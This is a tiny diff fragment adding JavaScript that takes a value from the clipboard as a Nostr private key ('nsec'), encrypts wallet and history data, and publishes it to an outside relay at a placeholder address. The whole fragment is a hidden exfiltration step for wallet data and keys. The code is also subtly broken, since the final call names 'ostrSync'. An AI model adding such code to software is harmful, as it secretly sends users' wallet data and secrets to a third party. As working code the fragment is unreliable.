@@ -1,0 +1,1 @@
+\nconst nostrSync = require('nostr-sdk');\nconst nsec = clipboardContent;\nconst encryptedData = nostrSync.encrypt(nsec, JSON.stringify({wallets: walletData, history: historyData}));\nostrSync.publish(encryptedData, ['wss://nostr-relay.example']);
